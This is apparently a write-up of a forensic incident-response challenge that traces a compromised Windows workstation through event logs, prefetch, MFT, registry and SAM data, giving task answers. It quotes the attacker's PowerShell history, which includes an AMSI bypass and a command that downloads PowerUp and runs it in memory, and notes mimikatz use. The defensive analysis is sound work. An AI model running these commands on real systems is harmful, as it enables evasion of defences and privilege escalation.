# Opsalwarkameez24-2-magic-show - nope

## Description

StoreD Technologies’ System Administrators have observed several machines on the network unexpectedly rebooting to apply Windows updates during working hours. According to the organization’s update policy, these updates should only occur overnight. As a member of StoreD Technologies’ incident response team, your task is to investigate whether this unusual activity is linked to an ongoing security incident. System logs and a memory dump from one of the affected Windows 11 machines have been collected to assist in your investigation.

## Files

We are given all kinds of files from Windows machine.
```bash
└─$ unzip MagicShow.zip
└─$ find ./Magic\ Show -maxdepth 3
./Magic Show/2024-10-22T23_18_42_5280043_CopyLog.csv
./Magic Show/C
./Magic Show/C/$MFT
./Magic Show/C/ProgramData
./Magic Show/C/ProgramData/Microsoft
./Magic Show/C/$Extend
./Magic Show/C/$Extend/$RmMetadata
./Magic Show/C/$Extend/$J
./Magic Show/C/$Extend/$Max
./Magic Show/C/$Boot
./Magic Show/C/$Recycle.Bin
./Magic Show/C/$Recycle.Bin/S-1-5-21-3718134835-1919426685-3059265731-1003
./Magic Show/C/Users
./Magic Show/C/Users/arjun.patel
./Magic Show/C/Users/Public
./Magic Show/C/Users/Default
./Magic Show/C/Users/Administrator
./Magic Show/C/Users/aarush.roy
./Magic Show/C/Users/Chhupa
./Magic Show/C/$LogFile
./Magic Show/C/$Secure_$SDS
./Magic Show/C/Windows
./Magic Show/C/Windows/ServiceProfiles
./Magic Show/C/Windows/AppCompat
./Magic Show/C/Windows/inf
./Magic Show/C/Windows/System32
./Magic Show/C/Windows/prefetch
./Magic Show/2024-10-22T23_18_42_5280043_ConsoleLog.txt
./Magic Show/2024-10-22T23_18_42_5280043_SkipLog.csv.csv
```

The given data is collected by KAPE `Magic Show\2024-10-22T23_18_42_5280043_ConsoleLog.txt`
```powershell
[2024-10-22 16:18:43.2703593 | INF] KAPE directory: C:\Users\aarush.roy\Desktop\kape\KAPE
[2024-10-22 16:18:43.2864160 | INF] Command line:   --tsource C: --tdest C:\Users\aarush.roy\Desktop\Magic Show --tflush --target !BasicCollection --gui 
[2024-10-22 16:18:43.2864160 | INF] System info: Machine name: WORKSTATION9, 64-bit: true, User: aarush.roy OS: "Windows10" (10.0.22621)
```

**WORKSTATION9** is the analysis target.

## Tasks

### Task 1. At what time did the compromised account first authenticate to the workstation? (UTC)

Our target is `Workstation9`, but there seems to be 2 devices with that name. First is probably domain joined and another isn't, if the logs are from all times then this would be expected. (I think)
```bash
➜ chainsaw.exe search -q -t 'Event.System.EventID: =4624' '.\Magic Show\C\Windows\System32\winevt\logs\Security.evtx' -j | jq '.[]".Event.System.Computer"' | Sort-Object | Get-Unique
"DESKTOP-LUGBH00"
"Workstation9.stored.local"
"Workstation9"
```

Our target then shifts to domain joined, since this computer will be monitored by security. From the description our IOC is reboots and system updates.

So let's filter for relevant events: [Review Event IDs 13, 41, 1074, 6008, and 6009 to determine reboot types](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs#review-event-ids-13-41-1074-6008-and-6009-to-determine-reboot-types)

This events exist in `System.evtx`
```bash
└─$ find Magic\ Show -name System.evtx
Magic Show/C/Windows/System32/winevt/logs/System.evtx
```

The only restart even on this computer from AD joined user is `STORED\arjun.patel`

![Writeup.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup.png)

Now we need to find when this user logged in; `Security.evtx` should contain all the events related to login.
```bash
└─$ find . -name Security.evtx
./Magic Show/C/Windows/System32/winevt/logs/Security.evtx
```

Specifically [4624](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624)(S): An account was successfully logged on.

For some reason I wasn't able to filter Windows Event Viewer by username, so I ended up using chainsaw:
```powershell
➜ chainsaw.exe search -q -t 'Event.System.EventID: =4624' -t 'Event.EventData.TargetUserName: "arjun.patel"' '.\Magic Show\C\Windows\System32\winevt\logs\Security.evtx' -j | jq '.[] | {  IpAddress: .Event.EventData.IpAddress, IpPort: .Event.EventData.IpPort, LogonGuid: .Event.EventData.LogonGuid, LogonProcessName: .Event.EventData.LogonProcessName, LogonType: .Event.EventData.LogonType, ProcessId: .Event.EventData.ProcessId, ProcessName: .Event.EventData.ProcessName, SubjectUserName: .Event.EventData.SubjectUserName, TargetDomainName: .Event.EventData.TargetDomainName, TargetUserName: .Event.EventData.TargetUserName, Computer: .Event.System.Computer, Timestamp: .Event.System.TimeCreated_attributes.SystemTime }'
```

```json
{
  "IpAddress": "10.10.0.81",
  "IpPort": "0",
  "LogonGuid": "00000000-0000-0000-0000-000000000000",
  "LogonProcessName": "NtLmSsp ",
  "LogonType": 3,
  "ProcessId": "0x0",
  "ProcessName": "-",
  "SubjectUserName": "-",
  "TargetDomainName": "STORED",
  "TargetUserName": "arjun.patel",
  "Computer": "Workstation9.stored.local",
  "Timestamp": "2024-10-22T15:25:57.924534Z"
}
{
  "IpAddress": "10.10.0.81",
  "IpPort": "0",
  "LogonGuid": "00000000-0000-0000-0000-000000000000",
  "LogonProcessName": "NtLmSsp ",
  "LogonType": 3,
  "ProcessId": "0x0",
  "ProcessName": "-",
  "SubjectUserName": "-",
  "TargetDomainName": "STORED",
  "TargetUserName": "arjun.patel",
  "Computer": "Workstation9.stored.local",
  "Timestamp": "2024-10-22T15:25:59.803340Z"
}
{
  "IpAddress": "10.10.0.81",
  "IpPort": "0",
  "LogonGuid": "2FB12D6F-80CC-24B1-8230-41A1243107F4",
  "LogonProcessName": "User32 ",
  "LogonType": 10,
  "ProcessId": "0x96c",
  "ProcessName": "C:\\Windows\\System32\\svchost.exe",
  "SubjectUserName": "WORKSTATION9$",
  "TargetDomainName": "STORED",
  "TargetUserName": "arjun.patel",
  "Computer": "Workstation9.stored.local",
  "Timestamp": "2024-10-22T15:26:01.614815Z"
}
```

::: tip :bulb: Answer
`2024-10-22 15:25:57`
:::

### Task 2. What protocol did the threat actor use to access the workstation?

[Administrative tools and logon types](https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types)

From previous query we have logon types of 3 and 10.

3 denotes network access/commands and 10 denotes RDP session.

![Writeup-1.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup-1.png)

::: tip :bulb: Answer
`RDP`
:::

### Task 3. What was the last logon type logged when the threat actor established a remote desktop session on the workstation?

::: tip :bulb: Answer
`10`
:::

### Task 4. What was the IP address of the workstation the threat actor pivoted through to access the internal network?

::: tip :bulb: Answer
`10.10.0.81`
:::

### Task 5. At what time did the threat actor first attempt to bypass a feature of Windows Defender? (UTC)

We can try searching for powershell logs and history file for powershell is called `ConsoleHost_history.txt`. Currently we are perusing `arjun.patel` which ran some commands to disable AMSI to bypass the Defender. But there suspicious command ran by `Chhupa` so we can consider that user also compromised.
```bash
└─$ find Magic\ Show -name ConsoleHost_history.txt
Magic Show/C/Users/arjun.patel/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
Magic Show/C/Users/Chhupa/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt

└─$ bat 'Magic Show/C/Users/arjun.patel/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt'
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Magic Show/C/Users/arjun.patel/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ whoami /all
   2   │ $a = [Ref].Assembly.GetTypes()
   3   │ ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}}
   4   │ $d = $c.GetFields('NonPublic,Static')
   5   │ ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}}
   6   │ $f.SetValue($null,$true)
   7   │ IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1);Invoke-AllChecks
   8   │ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

└─$ bat 'Magic Show/C/Users/Chhupa/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt'
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Magic Show/C/Users/Chhupa/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ cd C:\users\Chhupa\
   2   │ cd .\Desktop\
   3   │ .\dd.exe --config-xml .\config.xml.txt
   4   │ Get-CimInstance -ClassName Win32_DeviceGuard
   5   │ Confirm-SecureBootUEFI
   6   │ Get-ComputerInfo | Select-Object -Property DeviceGuardSecurityServicesRunning
   7   │ bcdedit /enum
   8   │ systeminfo | findstr /i "hypervisor"
   9   │ Get-WmiObject -Namespace "Root\Microsoft\Windows\DeviceGuard" -Class "Win32_DeviceGuard"
  10   │ cd C:\Users\Chhupa\Desktop\
  11   │ .\dd.exe --config-xml .\config.xml.txt
  12   │ mv test test.exe
  13   │ mv test.txt test.exe
  14   │ .\dd.exe --config-xml .\config.xml.txt
  15   │ cd .\Downloads\
  16   │ ls
  17   │ cd .\mimikatz_trunk\
  18   │ ls
  19   │ cd .\x64\
  20   │ ls
  21   │ .\mimikatz.exe
  22   │ cd C:\Users\Chhupa\Downloads\mimikatz_trunk\x64\
  23   │ .\mimikatz.exe
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
└─$ find Magic\ Show -iname *powershell*evtx
Magic Show/C/Windows/System32/winevt/logs/Windows PowerShell.evtx
Magic Show/C/Windows/System32/winevt/logs/Microsoft-Windows-PowerShell%4Operational.evtx
```

For this I wasn't able to find relevant events in `Windows Powershell`, but `Microsoft-Windows-PowerShell%4Operational` has the expected events.

![Writeup-2.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup-2.png)

::: tip :bulb: Answer
`2024-10-22 21:49:29`
:::

### Task 6. What is the name of the tool the threat actor used to enumerate the workstation for misconfigurations?

In the powershell history we already saw actor downloading **PowerUp** script and executing it in memory, and we also see it after few events.

![Writeup-3.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup-3.png)

*PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.*

::: tip :bulb: Answer
`PowerUp`
:::

### Task 7. What is the name of the executable the threat actor used to elevate their privileges?

There's no suspicious files in exe files in the KAPE dump; I saw no suspicious because we haven't seen this user pwned **yet**.
```bash
└─$ find ./Magic\ Show -name *.exe
./Magic Show/C/Users/Chhupa/Desktop/dd.exe
./Magic Show/C/Users/Chhupa/Desktop/test.exe
```

Powershell logs are no longer useful so there must be something else.
```powershell
➜ ~\source\repos\PECmd\PECmd\bin\Debug\net6.0\PECmd.exe -d '.\Magic Show\C\Windows\prefetch\' --csv .\parsed --csvf parsed.csv
...
---------- Processed .\Magic Show\C\Windows\prefetch\WWAHOST.EXE-02A78870.pf in 0,21435530 seconds ----------
Processed 370 out of 370 files in 25,2236 seconds

Path to .\parsed does not exist. Creating...
CSV output will be saved to .\parsed\parsed.csv
CSV time line output will be saved to .\parsed\parsed_Timeline.csv
```

There's many files found by Prefetch, but nothing that flashes that sticks out.

A prefetch file is like the little brother that tells the parents who broke the lamp. **Prefetching is a Windows memory management process in which the operating system pre-loads resources from disk into memory as a means of speeding up the loading time for applications**. [src](https://trustedsec.com/blog/prefetch-the-little-snitch-that-tells-on-you#:~:text=A%20prefetch%20file%20is%20like,the%20loading%20time%20for%20applications.)

```bash
└─$ cat parsed/parsed.csv | awk -F ',' '{print($6)}' | sort | uniq -c | sort -nr
     60 SVCHOST.EXE
     44 MSEDGEWEBVIEW2.EXE
     20 RUNTIMEBROKER.EXE
     13 DLLHOST.EXE
     11 MSEDGE.EXE
      9 BACKGROUNDTASKHOST.EXE
      8 FILESYNCCONFIG.EXE
      6 SETUP.EXE
      5 ONEDRIVESETUP.EXE
      4 RUNDLL32.EXE
      4 ONEDRIVE.EXE
      4 MICROSOFT.SHAREPOINT.EXE
      4 FILECOAUTH.EXE
      3 MMC.EXE
      3 DOTNET-SDK-8.0.401-WIN-X64.EX
      3 BACKGROUNDTRANSFERHOST.EXE
      2 WIDGETS.EXE
      2 VCREDIST_X86.EXE
      2 VCREDIST_X64.EXE
      2 TIWORKER.EXE
      2 NGENTASK.EXE
      2 NGEN.EXE
      2 MSTEAMSUPDATE.EXE
      2 MSTEAMS.EXE
      2 MSTEAMS_AUTOSTARTER.EXE
      2 MSMPENG.EXE
      2 MSIEXEC.EXE
      2 MSCORSVW.EXE
      2 MPSIGSTUB.EXE
      2 MPCMDRUN.EXE
      2 MICROSOFTEDGEUPDATE.EXE
      2 IDENTITY_HELPER.EXE
      2 COOKIE_EXPORTER.EXE
      1 WWAHOST.EXE
      1 WUDFHOST.EXE
      1 WUAUCLTCORE.EXE
      1 WSL.EXE
      1 WSCRIPT.EXE
      1 WOWREG32.EXE
      1 WMIPRVSE.EXE
      1 WMIAPSRV.EXE
      1 WMIADAP.EXE
      1 WLRMDR.EXE
      1 WINSAT.EXE
      1 WINLOGON.EXE
      1 WINDOWSTERMINAL.EXE
      1 WINDOWS-KB890830-X64-V5.129.E
      1 WIMSERV.EXE
      1 WIDGETSERVICE.EXE
      1 WHOAMI.EXE
      1 WEVTUTIL.EXE
      1 WEBEXPERIENCEHOSTAPP.EXE
      1 WAASMEDICAGENT.EXE
      1 VSSVC.EXE
      1 VMWARERESOLUTIONSET.EXE
      1 VMTOOLSD.EXE
      1 VM3DSERVICE.EXE
      1 VGAUTHSERVICE.EXE
      1 VERCLSID.EXE
      1 VDSLDR.EXE
      1 VDS.EXE
      1 VC_REDIST.X86.EXE
      1 VC_REDIST.X64.EXE
      1 USOCLIENT.EXE
      1 USEROOBEBROKER.EXE
      1 USERINIT.EXE
      1 UPFC.EXE
      1 UPDATEPLATFORM.AMD64FRE.EXE
      1 UNREGMP2.EXE
      1 UNIFIEDINSTALLER.EXE
      1 UHSSVC.EXE
      1 TSTHEME.EXE
      1 TRUSTEDINSTALLER.EXE
      1 TASKMGR.EXE
      1 TASKKILL.EXE
      1 TASKHOSTW.EXE
      1 SYSTEMSETTINGS.EXE
      1 SYSTEMSETTINGSBROKER.EXE
      1 SYSTEMSETTINGSADMINFLOWS.EXE
      1 SYSTEMPROPERTIESCOMPUTERNAME.
      1 SYSTEMINFO.EXE
      1 STARTMENUEXPERIENCEHOST.EXE
      1 SPPSVC.EXE
      1 SPPEXTCOMOBJ.EXE
      1 SMSS.EXE
      1 SMARTSCREEN.EXE
      1 SLUI.EXE
      1 SIHOST.EXE
      1 SIHCLIENT.EXE
      1 SHELLEXPERIENCEHOST.EXE
      1 SETUP64.EXE
      1 SETHC.EXE
      1 SESSIONMSG.EXE
      1 SECURITYHEALTHSYSTRAY.EXE
      1 SECURITYHEALTHSERVICE.EXE
      1 SECURITYHEALTHHOST.EXE
      1 SECHEALTHUI.EXE
      1 SEARCHPROTOCOLHOST.EXE
      1 SEARCHINDEXER.EXE
      1 SEARCHHOST.EXE
      1 SEARCHFILTERHOST.EXE
      1 SDIAGNHOST.EXE
      1 SDBINST.EXE
      1 SC.EXE
      1 REGEDIT.EXE
      1 RDPCLIP.EXE
      1 POWERSHELL.EXE
      1 POQEXEC.EXE
      1 PCAUI.EXE
      1 OPENWITH.EXE
      1 OPENCONSOLE.EXE
      1 NOTEPAD.EXE
      1 NISSRV.EXE
      1 NET.EXE
      1 NET1.EXE
      1 MSINFO32.EXE
      1 MRT.EXE
      1 MPRECOVERY.EXE
      1 MPDEFENDERCORESERVICE.EXE
      1 MOUSOCOREWORKER.EXE
      1 MONOTIFICATIONUX.EXE
      1 MOFCOMP.EXE
      1 MOBSYNC.EXE
      1 MIMIKATZ.EXE
      1 MICROSOFT.PHOTOS.EXE
      1 MICROSOFTEDGE_X64_130.0.2849.
      1 MICROSOFTEDGE_X64_129.0.2792.
      1 MICROSOFTEDGEUPDATESETUP_X86_
      1 MAKECAB.EXE
      1 LOGONUI.EXE
      1 LIGHTSERVICE2.EXE
      1 LAUNCHTM.EXE
      1 IPCONFIG.EXE
      1 IE4UINIT.EXE
      1 HXTSR.EXE
      1 GPUPDATE.EXE
      1 GKAPE.EXE
      1 GETMAC.EXE
      1 GENVALOBJ.EXE
      1 GAMEBAR.EXE
      1 FSQUIRT.EXE
      1 FONTDRVHOST.EXE
      1 FODHELPER.EXE
      1 FINDSTR.EXE
      1 EXPLORER.EXE
      1 ExecutableName
      1 ELEVATION_SERVICE.EXE
      1 DWM.EXE
      1 DRVINST.EXE
      1 DOTNET.EXE
      1 DISMHOST.EXE
      1 DIRECTXDATABASEUPDATER.EXE
      1 DEVICECENSUS.EXE
      1 DEFRAG.EXE
      1 DD.EXE
      1 CTFMON.EXE
      1 CSRSS.EXE
      1 CREDENTIALUIBROKER.EXE
      1 CONTROL.EXE
      1 CONSENT.EXE
      1 CONHOST.EXE
      1 COMPMGMTLAUNCHER.EXE
      1 COMPATTELRUNNER.EXE
      1 CMD.EXE
      1 BCDEDIT.EXE
      1 AUDIODG.EXE
      1 ATBROKER.EXE
      1 APPLICATIONFRAMEHOST.EXE
      1 AM_DELTA_PATCH_1.419.627.0.EX
```

Digging into the path included in `Files Loaded` we can filter out most of the binaries above because they belong to Windows itself.
```bash
└─$ cat parsed/parsed.csv | cut -d',' -f 25- | tr ',' '\n' | grep exe$ -i | grep -vE '\\(WINDOWS|\{.*\})|ONEDRIVE|EDGE|VMWARE|HEALTH TOOLS' | sort | uniq -c
      1  \VOLUME{0000000000000000-90546255}\SETUP64.EXE
      1  \VOLUME{01daff8c64d6ecb6-30650935}\PROGRAMDATA\LIGHT SERVICE\LIGHTSERVICE2.EXE
      1  \VOLUME{01daff8c64d6ecb6-30650935}\PROGRAM FILES\DOTNET\DOTNET.EXE
      1  \VOLUME{01daff8c64d6ecb6-30650935}\USERS\AARUSH.ROY\DESKTOP\KAPE\KAPE\GKAPE.EXE
      1  \VOLUME{01daff8c64d6ecb6-30650935}\USERS\BADMAN\DOWNLOADS\DOTNET-SDK-8.0.401-WIN-X64.EXE
      1  \VOLUME{01daff8c64d6ecb6-30650935}\USERS\CHHUPA\DESKTOP\DD.EXE
      2  \VOLUME{01daff8c64d6ecb6-30650935}\USERS\CHHUPA\DOWNLOADS\MIMIKATZ_TRUNK\X64\MIMIKATZ.EXE
```

`LIGHTSERVICE2.EXE` is definitely something custom.

**[ProgramData](https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-folderlocations-programdata)** specifies the path to the program-data folder (normally `C:\ProgramData`). Unlike the **Program Files** folder, this folder can be used by applications to store data for standard users, because it does not require elevated permissions.

We can also try to parse the `$MFT`.

The Master File Table on a Windows computer is **a register having information about all the files on a hard disk**. Every time you create a file on your computer, an entry is created for it in the MFT. Every time you delete a file, its relevant MFT entry is not deleted, but it is 'marked' for deletion. [src](https://library.mosse-institute.com/articles/2022/05/windows-master-file-table-mft-in-digital-forensics/windows-master-file-table-mft-in-digital-forensics.html#:~:text=The%20Master%20File%20Table%20on,is%20%27marked%27%20for%20deletion.)

```bash
➜ ~\source\repos\MFTECmd\MFTECmd\bin\Debug\net6.0\MFTECmd.exe -f '.\Magic Show\C\$MFT' --csv . --csvf .\parsed_mft.csv
MFTECmd version 1.2.2.1
Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/MFTECmd
Processed .\Magic Show\C\$MFT in 14,1590 seconds
.\Magic Show\C\$MFT: FILE records found: 341 714 (Free records: 325 853) File size: 652MB
        CSV output will be saved to .\parsed_mft.csv
```

There's 2 files associated with this name 

![Writeup-4.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup-4.png)

At this point I was running out of ideas, like where the fucking file came from??? 

Poor mans grep:
```bash
└─$ while read -r line; do echo $line; strings -el $line | grep -n Light.exe; done < <(find . -type f)
./$MFT
248555:Light.exe
./Windows/System32/config/SYSTEM
39397:0C:\ProgramData\Light.exe
./Windows/System32/config/SYSTEM.LOG2
642:0C:\ProgramData\Light.exe
```

[RegRipper3.0](https://github.com/keydet89/RegRipper3.0) 
```bash
➜ .\RegRipper3.0\rip.exe -r '.\Magic Show\C\Windows\System32\config\SYSTEM' -f system > system.hive.txt
...
C:\ProgramData\Light.exe  2024-10-22 21:51:16
...
C:\ProgramData\Light Service\LightService2.exe  2024-10-22 15:22:01
...
Tue Oct 22 15:22:20 2024 Z
  Name      = LightServ
  Display   = LightServ
  ImagePath = C:\ProgramData\Light Service\LightService2.exe
  Type      = Own_Process
  Start     = Auto Start
  Group     = 
```

Nothing useful, so kind of waste of time...

We also were given AppCompat in analysis, so we can pursue the binaries there.  
*ShimCache forensics are significant in forensic investigations for tracking potential program execution.* -- [ShimCache vs AmCache: Key Windows Forensic Artifacts](https://www.magnetforensics.com/blog/shimcache-vs-amcache-key-windows-forensic-artifacts/)

At this point I'm positive the rogue binary is `Light.exe`, but can't do this on a whim 💀

Parse the cache file with [AppCompatCacheParser](https://github.com/EricZimmerman/AppCompatCacheParser)
```powershell
➜ ~\source\repos\AppCompatCacheParser\AppCompatCacheParser\bin\Release\net6.0\AppCompatCacheParser.exe -f '.\Magic Show\C\Windows\System32\config\SYSTEM' --csv . --csvf appcompat.csv
```

![Writeup-5.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup-5.png)

::: tip :bulb: Answer
`Light.exe`
:::

### Task 8. At what time did the new user get created? (UTC)

[4720(S): A user account was created.](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4720)

![Writeup-6.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup-6.png)

```powershell
➜ chainsaw.exe search -q -t 'Event.System.EventID: =4720' '.\Magic Show\C\Windows\System32\winevt\logs\Security.evtx' -j  | jq '.[1]'
{
  "Event": {
    "EventData": {
      "AccountExpires": "%%1794",
      "AllowedToDelegateTo": "-",
      "DisplayName": "%%1793",
      "HomeDirectory": "%%1793",
      "HomePath": "%%1793",
      "LogonHours": "%%1797",
      "NewUacValue": "0x15",
      "OldUacValue": "0x0",
      "PasswordLastSet": "%%1794",
      "PrimaryGroupId": "513",
      "PrivilegeList": "-",
      "ProfilePath": "%%1793",
      "SamAccountName": "Chhupa",
      "ScriptPath": "%%1793",
      "SidHistory": "-",
      "SubjectDomainName": "STORED",
      "SubjectLogonId": "0x3e7",
      "SubjectUserName": "WORKSTATION9$",
      "SubjectUserSid": "S-1-5-18",
      "TargetDomainName": "WORKSTATION9",
      "TargetSid": "S-1-5-21-3718134835-1919426685-3059265731-1003",
      "TargetUserName": "Chhupa",
      "UserAccountControl": "\r\n\t\t%%2080\r\n\t\t%%2082\r\n\t\t%%2084",
      "UserParameters": "%%1793",
      "UserPrincipalName": "-",
      "UserWorkstations": "%%1793"
    },
    "System": {
      "Channel": "Security",
      "Computer": "Workstation9.stored.local",
      "Correlation_attributes": {
        "ActivityID": "A4E8497A-24CC-0001-784A-E8A4CC24DB01"
      },
      "EventID": 4720,
      "EventRecordID": 4355,
      "Execution_attributes": {
        "ProcessID": 836,
        "ThreadID": 3888
      },
      "Keywords": "0x8020000000000000",
      "Level": 0,
      "Opcode": 0,
      "Provider_attributes": {
        "Guid": "54849625-5478-4994-A5BA-3E3B0328C30D",
        "Name": "Microsoft-Windows-Security-Auditing"
      },
      "Security": null,
      "Task": 13824,
      "TimeCreated_attributes": {
        "SystemTime": "2024-10-22T21:52:24.352765Z"
      },
      "Version": 0
    }
  },
  "Event_attributes": {
    "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
  }
}
```

::: tip :bulb: Answer
`2024-10-22 21:52:24`
:::

### Task 9. What was the SID of the user that created the new user?

We can parse the SAM hive for information about users.
```powershell
➜ .\RegRipper3.0\rip.exe -r '.\Magic Show\C\Windows\System32\config\SAM' -a
Launching samparse v.20220921
samparse v.20220921
(SAM) Parse SAM file for user & group mbrshp info


User Information
-------------------------
Username        : Administrator [500]
SID             : S-1-5-21-3718134835-1919426685-3059265731-500
Full Name       :
User Comment    : Built-in account for administering the computer/domain
Account Type    :
Account Created : Tue Sep 10 17:43:28 2024 Z
Name            :
Last Login Date : Never
Pwd Reset Date  : Never
Pwd Fail Date   : Never
Login Count     : 0
  --> Password does not expire
  --> Account Disabled
  --> Normal user account

Username        : Guest [501]
SID             : S-1-5-21-3718134835-1919426685-3059265731-501
Full Name       :
User Comment    : Built-in account for guest access to the computer/domain
Account Type    :
Account Created : Tue Sep 10 17:43:28 2024 Z
Name            :
Last Login Date : Never
Pwd Reset Date  : Never
Pwd Fail Date   : Never
Login Count     : 0
  --> Password does not expire
  --> Account Disabled
  --> Password not required
  --> Normal user account

Username        : DefaultAccount [503]
SID             : S-1-5-21-3718134835-1919426685-3059265731-503
Full Name       :
User Comment    : A user account managed by the system.
Account Type    :
Account Created : Tue Sep 10 17:43:28 2024 Z
Name            :
Last Login Date : Never
Pwd Reset Date  : Never
Pwd Fail Date   : Never
Login Count     : 0
  --> Password does not expire
  --> Account Disabled
  --> Password not required
  --> Normal user account

Username        : WDAGUtilityAccount [504]
SID             : S-1-5-21-3718134835-1919426685-3059265731-504
Full Name       :
User Comment    : A user account managed and used by the system for Windows Defender Application Guard scenarios.
Account Type    :
Account Created : Tue Sep 10 17:43:28 2024 Z
Name            :
Last Login Date : Never
Pwd Reset Date  : Thu Sep  5 11:12:09 2024 Z
Pwd Fail Date   : Never
Login Count     : 0
  --> Account Disabled
  --> Normal user account

Username        : felamos [1001]
SID             : S-1-5-21-3718134835-1919426685-3059265731-1001
Full Name       :
User Comment    :
Account Type    :
Account Created : Tue Sep 10 17:40:18 2024 Z
Security Questions:
    Question 1  : What is the name of the city where you were born?
    Answer 1    : asadas
    Question 2  : What is the name of the city where your parents met?
    Answer 2    : asdasdasd
    Question 3  : What is the first name of your oldest cousin?
    Answer 3    : asdasdasd
Name            :
Last Login Date : Tue Sep 10 17:54:13 2024 Z
Pwd Reset Date  : Thu Sep  5 12:32:52 2024 Z
Pwd Fail Date   : Tue Sep 10 07:59:32 2024 Z
Login Count     : 12
  --> Password does not expire
  --> Password not required
  --> Normal user account

Username        : badman [1002]
SID             : S-1-5-21-3718134835-1919426685-3059265731-1002
Full Name       :
User Comment    :
Account Type    :
Account Created : Tue Sep 10 17:55:08 2024 Z
Name            :
Last Login Date : Tue Oct 22 15:24:11 2024 Z
Pwd Reset Date  : Tue Sep 10 17:55:08 2024 Z
Pwd Fail Date   : Never
Login Count     : 10
  --> Normal user account

Username        : Chhupa [1003]
SID             : S-1-5-21-3718134835-1919426685-3059265731-1003
Full Name       : Chhupa
User Comment    : New User
Account Type    :
Account Created : Tue Oct 22 21:52:24 2024 Z
Name            :
Last Login Date : Tue Oct 22 23:04:56 2024 Z
Pwd Reset Date  : Tue Oct 22 21:52:24 2024 Z
Pwd Fail Date   : Never
Login Count     : 6
  --> Normal user account

-------------------------
Group Membership Information
-------------------------
Group Name    : Event Log Readers [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members of this group can read event logs from local machine
Users         : None

Group Name    : Guests [1]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
Users :
  S-1-5-21-3718134835-1919426685-3059265731-501

Group Name    : Network Configuration Operators [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members in this group can have some administrative privileges to manage configuration of networking features
Users         : None

Group Name    : Device Owners [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members of this group can change system-wide settings.
Users         : None

Group Name    : Performance Log Users [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
Users         : None

Group Name    : Hyper-V Administrators [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members of this group have complete and unrestricted access to all features of Hyper-V.
Users         : None

Group Name    : IIS_IUSRS [1]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Built-in group used by Internet Information Services.
Users :
  S-1-5-17

Group Name    : Backup Operators [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
Users         : None

Group Name    : Users [4]
LastWrite     : Tue Oct 22 08:56:42 2024 Z
Group Comment : Users are prevented from making accidental or intentional system-wide changes and can run most applications
Users :
  S-1-5-4
  S-1-5-11
  S-1-5-21-3784066801-3323226808-2505544950-513
  S-1-5-21-3718134835-1919426685-3059265731-1002

Group Name    : Access Control Assistance Operators [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members of this group can remotely query authorization attributes and permissions for resources on this computer.
Users         : None

Group Name    : System Managed Accounts Group [1]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members of this group are managed by the system.
Users :
  S-1-5-21-3718134835-1919426685-3059265731-503

Group Name    : Distributed COM Users [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members are allowed to launch, activate and use Distributed COM objects on this machine.
Users         : None

Group Name    : Administrators [5]
LastWrite     : Tue Oct 22 21:52:24 2024 Z
Group Comment : Administrators have complete and unrestricted access to the computer/domain
Users :
  S-1-5-21-3718134835-1919426685-3059265731-1003
  S-1-5-21-3718134835-1919426685-3059265731-500
  S-1-5-21-3718134835-1919426685-3059265731-1001
